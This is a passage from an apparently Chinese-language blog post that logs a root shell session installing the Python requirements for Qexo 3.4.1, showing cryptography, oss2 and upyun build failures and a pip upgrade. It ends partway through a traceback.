https://files.pythonhosted.org/packages/fc/07/e720e53bfab016ebcc34241695ccc06a9e3d91ba19b40ca81317afbdc440/psycopg2-binary-2.9.9.tar.gz<br>Collecting cryptography==42.0.4 (from -r requirements.txt (line 17))<br>  Cache entry deserialization failed, entry ignored<br>  Downloading https://files.pythonhosted.org/packages/81/d8/214d25515bf6034dce99aba22eeb47443b14c82160114e3d3f33067c6d3b/cryptography-42.0.4.tar.gz (670kB)<br>    100% |████████████████████████████████| 675kB 1.3MB/s <br>    Complete output from <span class="hljs-built_in">command</span> python setup.py egg_info:<br>    Traceback (most recent call last):<br>      File <span class="hljs-string">&quot;&lt;string&gt;&quot;</span>, line 1, <span class="hljs-keyword">in</span> &lt;module&gt;<br>      File <span class="hljs-string">&quot;/usr/lib/python3.8/tokenize.py&quot;</span>, line 392, <span class="hljs-keyword">in</span> open<br>        buffer = _builtin_open(filename, <span class="hljs-string">&#x27;rb&#x27;</span>)<br>    FileNotFoundError: [Errno 2] No such file or directory: <span class="hljs-string">&#x27;/tmp/pip-build-xdpazwvh/cryptography/setup.py&#x27;</span><br>    <br>    ----------------------------------------<br>Command <span class="hljs-string">&quot;python setup.py egg_info&quot;</span> failed with error code 1 <span class="hljs-keyword">in</span> /tmp/pip-build-xdpazwvh/cryptography/<br>[root@ningan Qexo-3.4.1]<span class="hljs-comment"># </span><br>[root@ningan Qexo-3.4.1]<span class="hljs-comment"># </span><br></code></pre></td></tr></table></figure><h3 id="小插曲：升级pip"><a href="#小插曲：升级pip" class="headerlink" title="小插曲：升级pip"></a>小插曲：升级pip</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><code class="hljs bash">[root@ningan Qexo-3.4.1]<span class="hljs-comment"># python3.8 -m pip install cryptography==42.0.4</span><br>Collecting cryptography==42.0.4<br>  Using cached https://files.pythonhosted.org/packages/81/d8/214d25515bf6034dce99aba22eeb47443b14c82160114e3d3f33067c6d3b/cryptography-42.0.4.tar.gz<br>    Complete output from <span class="hljs-built_in">command</span> python setup.py egg_info:<br>    Traceback (most recent call last):<br>      File <span class="hljs-string">&quot;&lt;string&gt;&quot;</span>, line 1, <span class="hljs-keyword">in</span> &lt;module&gt;<br>      File <span class="hljs-string">&quot;/usr/lib/python3.8/tokenize.py&quot;</span>, line 392, <span class="hljs-keyword">in</span> open<br>        buffer = _builtin_open(filename, <span class="hljs-string">&#x27;rb&#x27;</span>)<br>    FileNotFoundError: [Errno 2] No such file or directory: <span class="hljs-string">&#x27;/tmp/pip-build-4r5u7y_l/cryptography/setup.py&#x27;</span><br>    <br>    ----------------------------------------<br>Command <span class="hljs-string">&quot;python setup.py egg_info&quot;</span> failed with error code 1 <span class="hljs-keyword">in</span> /tmp/pip-build-4r5u7y_l/cryptography/<br>[root@ningan Qexo-3.4.1]<span class="hljs-comment"># </span><br>[root@ningan Qexo-3.4.1]<span class="hljs-comment"># </span><br>[root@ningan Qexo-3.4.1]<span class="hljs-comment"># python3.8 -m pip install --upgrade pip</span><br>Cache entry deserialization failed, entry ignored<br>Collecting pip<br>  Downloading https://files.pythonhosted.org/packages/ef/7d/500c9ad20238fcfcb4cb9243eede163594d7020ce87bd9610c9e02771876/pip-24.3.1-py3-none-any.whl (1.8MB)<br>    100% |████████████████████████████████| 1.8MB 613kB/s <br>Installing collected packages: pip<br>  Found existing installation: pip 9.0.1<br>    Not uninstalling pip at /usr/lib/python3/dist-packages, outside environment /usr<br>Successfully installed pip-24.3.1<br>[root@ningan Qexo-3.4.1]<span class="hljs-comment"># </span><br>[root@ningan Qexo-3.4.1]<span class="hljs-comment"># </span><br>[root@ningan Qexo-3.4.1]<span class="hljs-comment"># </span><br>[root@ningan Qexo-3.4.1]<span class="hljs-comment"># python3.8 -m pip install cryptography==42.0.4</span><br>Collecting cryptography==42.0.4<br>  Downloading cryptography-42.0.4-cp37-abi3-manylinux_2_17_x86_64.manylinux2014_x86_64.whl.metadata (5.3 kB)<br>Collecting cffi&gt;=1.12 (from cryptography==42.0.4)<br>  Downloading cffi-1.17.1-cp38-cp38-manylinux_2_17_x86_64.manylinux2014_x86_64.whl.metadata (1.5 kB)<br>Collecting pycparser (from cffi&gt;=1.12-&gt;cryptography==42.0.4)<br>  Downloading pycparser-2.22-py3-none-any.whl.metadata (943 bytes)<br>Downloading cryptography-42.0.4-cp37-abi3-manylinux_2_17_x86_64.manylinux2014_x86_64.whl (4.6 MB)<br>   ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ 4.6/4.6 MB 7.6 MB/s eta 0:00:00<br>Downloading cffi-1.17.1-cp38-cp38-manylinux_2_17_x86_64.manylinux2014_x86_64.whl (446 kB)<br>Downloading pycparser-2.22-py3-none-any.whl (117 kB)<br>WARNING: Error parsing dependencies of bcc: Invalid version: <span class="hljs-string">&#x27;0.24.0-8f40d6f5&#x27;</span><br>WARNING: Error parsing dependencies of distro-info: Invalid version: <span class="hljs-string">&#x27;0.18ubuntu0.18.04.1&#x27;</span><br>Installing collected packages: pycparser, cffi, cryptography<br>Successfully installed cffi-1.17.1 cryptography-42.0.4 pycparser-2.22<br>WARNING: Running pip as the <span class="hljs-string">&#x27;root&#x27;</span> user can result <span class="hljs-keyword">in</span> broken permissions and conflicting behaviour with the system package manager, possibly rendering your system unusable.It is recommended to use a virtual environment instead: https://pip.pypa.io/warnings/venv. Use the --root-user-action option <span class="hljs-keyword">if</span> you know what you are doing and want to suppress this warning.<br>[root@ningan Qexo-3.4.1]<span class="hljs-comment"># </span><br></code></pre></td></tr></table></figure><h3 id="回到主线-4"><a href="#回到主线-4" class="headerlink" title="回到主线"></a>回到主线</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br></pre></td><td class="code"><pre><code class="hljs bash">[root@ningan Qexo-3.4.1]<span class="hljs-comment"># python3.8 -m pip install -r requirements.txt</span><br>Collecting Django==3.2.25 (from -r requirements.txt (line 1))<br>  Downloading Django-3.2.25-py3-none-any.whl.metadata (4.1 kB)<br>Collecting PyMySQL==1.0.2 (from -r requirements.txt (line 2))<br>  Downloading PyMySQL-1.0.2-py3-none-any.whl.metadata (5.1 kB)<br>Collecting boto3==1.34.44 (from -r requirements.txt (line 3))<br>  Downloading boto3-1.34.44-py3-none-any.whl.metadata (6.6 kB)<br>Collecting requests==2.31.0 (from -r requirements.txt (line 4))<br>  Downloading requests-2.31.0-py3-none-any.whl.metadata (4.6 kB)<br>Collecting PyGithub==2.2.0 (from -r requirements.txt (line 5))<br>  Downloading PyGithub-2.2.0-py3-none-any.whl.metadata (3.8 kB)<br>Collecting python-gitlab==4.4.0 (from -r requirements.txt (line 6))<br>  Downloading python_gitlab-4.4.0-py3-none-any.whl.metadata (7.7 kB)<br>Collecting html2text==2020.1.16 (from -r requirements.txt (line 7))<br>  Downloading html2text-2020.1.16-py3-none-any.whl.metadata (4.3 kB)<br>Collecting PyYAML==6.0.1 (from -r requirements.txt (line 8))<br>  Downloading PyYAML-6.0.1-cp38-cp38-manylinux_2_17_x86_64.manylinux2014_x86_64.whl.metadata (2.1 kB)<br>Collecting urllib3==1.26.18 (from -r requirements.txt (line 9))<br>  Downloading urllib3-1.26.18-py2.py3-none-any.whl.metadata (48 kB)<br>Collecting Markdown==3.5.2 (from -r requirements.txt (line 10))<br>  Downloading Markdown-3.5.2-py3-none-any.whl.metadata (7.0 kB)<br>Collecting djongo5==1.3.9 (from -r requirements.txt (line 11))<br>  Downloading djongo5-1.3.9-py3-none-any.whl.metadata (1.9 kB)<br>Collecting django-cors-headers==4.1.0 (from -r requirements.txt (line 12))<br>  Downloading django_cors_headers-4.1.0-py3-none-any.whl.metadata (16 kB)<br>Collecting pymongo==3.13.0 (from -r requirements.txt (line 13))<br>  Downloading pymongo-3.13.0-cp38-cp38-manylinux_2_17_x86_64.manylinux2014_x86_64.whl.metadata (9.7 kB)<br>Collecting dnspython==2.2.1 (from -r requirements.txt (line 14))<br>  Downloading dnspython-2.2.1-py3-none-any.whl.metadata (4.9 kB)<br>Collecting sqlparse==0.2.4 (from -r requirements.txt (line 15))<br>  Downloading sqlparse-0.2.4-py2.py3-none-any.whl.metadata (2.2 kB)<br>Collecting psycopg2-binary==2.9.9 (from -r requirements.txt (line 16))<br>  Downloading psycopg2_binary-2.9.9-cp38-cp38-manylinux_2_17_x86_64.manylinux2014_x86_64.whl.metadata (4.4 kB)<br>Requirement already satisfied: cryptography==42.0.4 <span class="hljs-keyword">in</span> /usr/local/lib/python3.8/dist-packages (from -r requirements.txt (line 17)) (42.0.4)<br>Collecting pyopenssl==24.0.0 (from -r requirements.txt (line 18))<br>  Downloading pyOpenSSL-24.0.0-py3-none-any.whl.metadata (12 kB)<br>Collecting oss2==2.18.4 (from -r requirements.txt (line 19))<br>  Downloading oss2-2.18.4.tar.gz (278 kB)<br>  Preparing metadata (setup.py) ... <span class="hljs-keyword">done</span><br>Collecting beautifulsoup4==4.12.3 (from -r requirements.txt (line 20))<br>  Downloading beautifulsoup4-4.12.3-py3-none-any.whl.metadata (3.8 kB)<br>Collecting upyun==2.5.5 (from -r requirements.txt (line 21))<br>  Downloading upyun-2.5.5.tar.gz (19 kB)<br>  Preparing metadata (setup.py) ... <span class="hljs-keyword">done</span><br>Collecting asgiref&lt;4,&gt;=3.3.2 (from Django==3.2.25-&gt;-r requirements.txt (line 1))<br>  Downloading asgiref-3.8.1-py3-none-any.whl.metadata (9.3 kB)<br>Requirement already satisfied: pytz <span class="hljs-keyword">in</span> /usr/lib/python3/dist-packages (from Django==3.2.25-&gt;-r requirements.txt (line 1)) (2018.3)<br>Collecting botocore&lt;1.35.0,&gt;=1.34.44 (from boto3==1.34.44-&gt;-r requirements.txt (line 3))<br>  Downloading botocore-1.34.162-py3-none-any.whl.metadata (5.7 kB)<br>Collecting jmespath&lt;2.0.0,&gt;=0.7.1 (from boto3==1.34.44-&gt;-r requirements.txt (line 3))<br>  Downloading jmespath-1.0.1-py3-none-any.whl.metadata (7.6 kB)<br>Collecting s3transfer&lt;0.11.0,&gt;=0.10.0 (from boto3==1.34.44-&gt;-r requirements.txt (line 3))<br>  Downloading s3transfer-0.10.3-py3-none-any.whl.metadata (1.7 kB)<br>Collecting charset-normalizer&lt;4,&gt;=2 (from requests==2.31.0-&gt;-r requirements.txt (line 4))<br>  Downloading charset_normalizer-3.4.0-cp38-cp38-manylinux_2_17_x86_64.manylinux2014_x86_64.whl.metadata (34 kB)<br>Requirement already satisfied: idna&lt;4,&gt;=2.5 <span class="hljs-keyword">in</span> /usr/lib/python3/dist-packages (from requests==2.31.0-&gt;-r requirements.txt (line 4)) (2.6)<br>Requirement already satisfied: certifi&gt;=2017.4.17 <span class="hljs-keyword">in</span> /usr/lib/python3/dist-packages (from requests==2.31.0-&gt;-r requirements.txt (line 4)) (2018.1.18)<br>Collecting pynacl&gt;=1.4.0 (from PyGithub==2.2.0-&gt;-r requirements.txt (line 5))<br>  Downloading PyNaCl-1.5.0-cp36-abi3-manylinux_2_17_x86_64.manylinux2014_x86_64.manylinux_2_24_x86_64.whl.metadata (8.6 kB)<br>Collecting pyjwt&gt;=2.4.0 (from pyjwt[crypto]&gt;=2.4.0-&gt;PyGithub==2.2.0-&gt;-r requirements.txt (line 5))<br>  Downloading PyJWT-2.9.0-py3-none-any.whl.metadata (3.0 kB)<br>Collecting typing-extensions&gt;=4.0.0 (from PyGithub==2.2.0-&gt;-r requirements.txt (line 5))<br>  Downloading typing_extensions-4.12.2-py3-none-any.whl.metadata (3.0 kB)<br>Collecting Deprecated (from PyGithub==2.2.0-&gt;-r requirements.txt (line 5))<br>  Downloading Deprecated-1.2.14-py2.py3-none-any.whl.metadata (5.4 kB)<br>Collecting requests-toolbelt&gt;=0.10.1 (from python-gitlab==4.4.0-&gt;-r requirements.txt (line 6))<br>  Downloading requests_toolbelt-1.0.0-py2.py3-none-any.whl.metadata (14 kB)<br>Collecting importlib-metadata&gt;=4.4 (from Markdown==3.5.2-&gt;-r requirements.txt (line 10))<br>  Downloading importlib_metadata-8.5.0-py3-none-any.whl.metadata (4.8 kB)<br>Collecting pytz (from Django==3.2.25-&gt;-r requirements.txt (line 1))<br>  Downloading pytz-2024.2-py2.py3-none-any.whl.metadata (22 kB)<br>Requirement already satisfied: cffi&gt;=1.12 <span class="hljs-keyword">in</span> /usr/local/lib/python3.8/dist-packages (from cryptography==42.0.4-&gt;-r requirements.txt (line 17)) (1.17.1)<br>Collecting crcmod&gt;=1.7 (from oss2==2.18.4-&gt;-r requirements.txt (line 19))<br>  Downloading crcmod-1.7.tar.gz (89 kB)<br>  Preparing metadata (setup.py) ... <span class="hljs-keyword">done</span><br>Collecting pycryptodome&gt;=3.4.7 (from oss2==2.18.4-&gt;-r requirements.txt (line 19))<br>  Downloading pycryptodome-3.21.0-cp36-abi3-manylinux_2_17_x86_64.manylinux2014_x86_64.whl.metadata (3.4 kB)<br>Collecting aliyun-python-sdk-kms&gt;=2.4.1 (from oss2==2.18.4-&gt;-r requirements.txt (line 19))<br>  Downloading aliyun_python_sdk_kms-2.16.5-py2.py3-none-any.whl.metadata (1.5 kB)<br>Collecting aliyun-python-sdk-core&gt;=2.13.12 (from oss2==2.18.4-&gt;-r requirements.txt (line 19))<br>  Downloading aliyun-python-sdk-core-2.16.0.tar.gz (449 kB)<br>  Preparing metadata (setup.py) ... <span class="hljs-keyword">done</span><br>Collecting six (from oss2==2.18.4-&gt;-r requirements.txt (line 19))<br>  Downloading six-1.16.0-py2.py3-none-any.whl.metadata (1.8 kB)<br>Collecting soupsieve&gt;1.2 (from beautifulsoup4==4.12.3-&gt;-r requirements.txt (line 20))<br>  Downloading soupsieve-2.6-py3-none-any.whl.metadata (4.6 kB)<br>Collecting jmespath&lt;2.0.0,&gt;=0.7.1 (from boto3==1.34.44-&gt;-r requirements.txt (line 3))<br>  Downloading jmespath-0.10.0-py2.py3-none-any.whl.metadata (8.0 kB)<br>Requirement already satisfied: python-dateutil&lt;3.0.0,&gt;=2.1 <span class="hljs-keyword">in</span> /usr/lib/python3/dist-packages (from botocore&lt;1.35.0,&gt;=1.34.44-&gt;boto3==1.34.44-&gt;-r requirements.txt (line 3)) (2.6.1)<br>Requirement already satisfied: pycparser <span class="hljs-keyword">in</span> /usr/local/lib/python3.8/dist-packages (from cffi&gt;=1.12-&gt;cryptography==42.0.4-&gt;-r requirements.txt (line 17)) (2.22)<br>Collecting zipp&gt;=3.20 (from importlib-metadata&gt;=4.4-&gt;Markdown==3.5.2-&gt;-r requirements.txt (line 10))<br>  Downloading zipp-3.20.2-py3-none-any.whl.metadata (3.7 kB)<br>Collecting wrapt&lt;2,&gt;=1.10 (from Deprecated-&gt;PyGithub==2.2.0-&gt;-r requirements.txt (line 5))<br>  Downloading wrapt-1.16.0-cp38-cp38-manylinux_2_5_x86_64.manylinux1_x86_64.manylinux_2_17_x86_64.manylinux2014_x86_64.whl.metadata (6.6 kB)<br>Downloading Django-3.2.25-py3-none-any.whl (7.9 MB)<br>   ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ 7.9/7.9 MB 12.1 MB/s eta 0:00:00<br>Downloading PyMySQL-1.0.2-py3-none-any.whl (43 kB)<br>Downloading boto3-1.34.44-py3-none-any.whl (139 kB)<br>Downloading requests-2.31.0-py3-none-any.whl (62 kB)<br>Downloading PyGithub-2.2.0-py3-none-any.whl (350 kB)<br>Downloading python_gitlab-4.4.0-py3-none-any.whl (138 kB)<br>Downloading html2text-2020.1.16-py3-none-any.whl (32 kB)<br>Downloading PyYAML-6.0.1-cp38-cp38-manylinux_2_17_x86_64.manylinux2014_x86_64.whl (736 kB)<br>   ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ 736.6/736.6 kB 15.2 MB/s eta 0:00:00<br>Downloading urllib3-1.26.18-py2.py3-none-any.whl (143 kB)<br>Downloading Markdown-3.5.2-py3-none-any.whl (103 kB)<br>Downloading djongo5-1.3.9-py3-none-any.whl (51 kB)<br>Downloading django_cors_headers-4.1.0-py3-none-any.whl (12 kB)<br>Downloading pymongo-3.13.0-cp38-cp38-manylinux_2_17_x86_64.manylinux2014_x86_64.whl (526 kB)<br>   ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ 526.2/526.2 kB 16.1 MB/s eta 0:00:00<br>Downloading dnspython-2.2.1-py3-none-any.whl (269 kB)<br>Downloading sqlparse-0.2.4-py2.py3-none-any.whl (38 kB)<br>Downloading psycopg2_binary-2.9.9-cp38-cp38-manylinux_2_17_x86_64.manylinux2014_x86_64.whl (3.0 MB)<br>   ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ 3.0/3.0 MB 15.3 MB/s eta 0:00:00<br>Downloading pyOpenSSL-24.0.0-py3-none-any.whl (58 kB)<br>Downloading beautifulsoup4-4.12.3-py3-none-any.whl (147 kB)<br>Downloading aliyun_python_sdk_kms-2.16.5-py2.py3-none-any.whl (99 kB)<br>Downloading asgiref-3.8.1-py3-none-any.whl (23 kB)<br>Downloading botocore-1.34.162-py3-none-any.whl (12.5 MB)<br>   ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ 12.5/12.5 MB 13.7 MB/s eta 0:00:00<br>Downloading charset_normalizer-3.4.0-cp38-cp38-manylinux_2_17_x86_64.manylinux2014_x86_64.whl (143 kB)<br>Downloading importlib_metadata-8.5.0-py3-none-any.whl (26 kB)<br>Downloading jmespath-0.10.0-py2.py3-none-any.whl (24 kB)<br>Downloading pycryptodome-3.21.0-cp36-abi3-manylinux_2_17_x86_64.manylinux2014_x86_64.whl (2.3 MB)<br>   ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ 2.3/2.3 MB 15.6 MB/s eta 0:00:00<br>Downloading PyJWT-2.9.0-py3-none-any.whl (22 kB)<br>Downloading PyNaCl-1.5.0-cp36-abi3-manylinux_2_17_x86_64.manylinux2014_x86_64.manylinux_2_24_x86_64.whl (856 kB)<br>   ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ 856.7/856.7 kB 11.2 MB/s eta 0:00:00<br>Downloading pytz-2024.2-py2.py3-none-any.whl (508 kB)<br>Downloading requests_toolbelt-1.0.0-py2.py3-none-any.whl (54 kB)<br>Downloading s3transfer-0.10.3-py3-none-any.whl (82 kB)<br>Downloading soupsieve-2.6-py3-none-any.whl (36 kB)<br>Downloading typing_extensions-4.12.2-py3-none-any.whl (37 kB)<br>Downloading Deprecated-1.2.14-py2.py3-none-any.whl (9.6 kB)<br>Downloading six-1.16.0-py2.py3-none-any.whl (11 kB)<br>Downloading wrapt-1.16.0-cp38-cp38-manylinux_2_5_x86_64.manylinux1_x86_64.manylinux_2_17_x86_64.manylinux2014_x86_64.whl (83 kB)<br>Downloading zipp-3.20.2-py3-none-any.whl (9.2 kB)<br>Building wheels <span class="hljs-keyword">for</span> collected packages: oss2, upyun, aliyun-python-sdk-core, crcmod<br>  Building wheel <span class="hljs-keyword">for</span> oss2 (setup.py) ... error<br>  error: subprocess-exited-with-error<br>  <br>  × python setup.py bdist_wheel did not run successfully.<br>  │ <span class="hljs-built_in">exit</span> code: 1<br>  ╰─&gt; [20 lines of output]<br>      Traceback (most recent call last):<br>        File <span class="hljs-string">&quot;&lt;string&gt;&quot;</span>, line 2, <span class="hljs-keyword">in</span> &lt;module&gt;<br>        File <span class="hljs-string">&quot;&lt;pip-setuptools-caller&gt;&quot;</span>, line 34, <span class="hljs-keyword">in</span> &lt;module&gt;<br>        File <span class="hljs-string">&quot;/tmp/pip-install-y1qa10vz/oss2_3c12511985784e818c946fc1cbf7dbca/setup.py&quot;</span>, line 24, <span class="hljs-keyword">in</span> &lt;module&gt;<br>          setup(<br>        File <span class="hljs-string">&quot;/usr/local/lib/python3.8/dist-packages/setuptools/__init__.py&quot;</span>, line 117, <span class="hljs-keyword">in</span> setup<br>          <span class="hljs-built_in">return</span> distutils.core.setup(**attrs)<br>        File <span class="hljs-string">&quot;/usr/local/lib/python3.8/dist-packages/setuptools/_distutils/core.py&quot;</span>, line 170, <span class="hljs-keyword">in</span> setup<br>          ok = dist.parse_command_line()<br>        File <span class="hljs-string">&quot;/usr/local/lib/python3.8/dist-packages/setuptools/_distutils/dist.py&quot;</span>, line 472, <span class="hljs-keyword">in</span> parse_command_line<br>          args = self._parse_command_opts(parser, args)<br>        File <span class="hljs-string">&quot;/usr/local/lib/python3.8/dist-packages/setuptools/dist.py&quot;</span>, line 901, <span class="hljs-keyword">in</span> _parse_command_opts<br>          nargs = _Distribution._parse_command_opts(self, parser, args)<br>        File <span class="hljs-string">&quot;/usr/local/lib/python3.8/dist-packages/setuptools/_distutils/dist.py&quot;</span>, line 531, <span class="hljs-keyword">in</span> _parse_command_opts<br>          cmd_class = self.get_command_class(<span class="hljs-built_in">command</span>)<br>        File <span class="hljs-string">&quot;/usr/local/lib/python3.8/dist-packages/setuptools/dist.py&quot;</span>, line 738, <span class="hljs-keyword">in</span> get_command_class<br>          from .command.bdist_wheel import bdist_wheel<br>        File <span class="hljs-string">&quot;/usr/local/lib/python3.8/dist-packages/setuptools/command/bdist_wheel.py&quot;</span>, line 26, <span class="hljs-keyword">in</span> &lt;module&gt;<br>          from wheel.wheelfile import WheelFile<br>      ModuleNotFoundError: No module named <span class="hljs-string">&#x27;wheel.wheelfile&#x27;</span><br>      [end of output]<br>  <br>  note: This error originates from a subprocess, and is likely not a problem with pip.<br>  ERROR: Failed building wheel <span class="hljs-keyword">for</span> oss2<br>  Running setup.py clean <span class="hljs-keyword">for</span> oss2<br>  Building wheel <span class="hljs-keyword">for</span> upyun (setup.py) ... error<br>  error: subprocess-exited-with-error<br>  <br>  × python setup.py bdist_wheel did not run successfully.<br>  │ <span class="hljs-built_in">exit</span> code: 1<br>  ╰─&gt; [20 lines of output]<br>      Traceback (most recent call last):<br>        File <span class="hljs-string">&quot;&lt;string&gt;&quot;</span>, line 2, <span class="hljs-keyword">in</span> &lt;module&gt;<br>        File <span class="hljs-string">&quot;&lt;pip-setuptools-caller&gt;&quot;</span>, line 34, <span class="hljs-keyword">in</span> &lt;module&gt;<br>        File <span class="hljs-string">&quot;/tmp/pip-install-y1qa10vz/upyun_c4fed285bffc47f19b62abc4cfd8eb5c/setup.py&quot;</span>, line 27, <span class="hljs-keyword">in</span> &lt;module&gt;<br>          setup(<br>        File <span class="hljs-string">&quot;/usr/local/lib/python3.8/dist-packages/setuptools/__init__.py&quot;</span>, line 117, <span class="hljs-keyword">in</span> setup<br>          <span class="hljs-built_in">return</span> 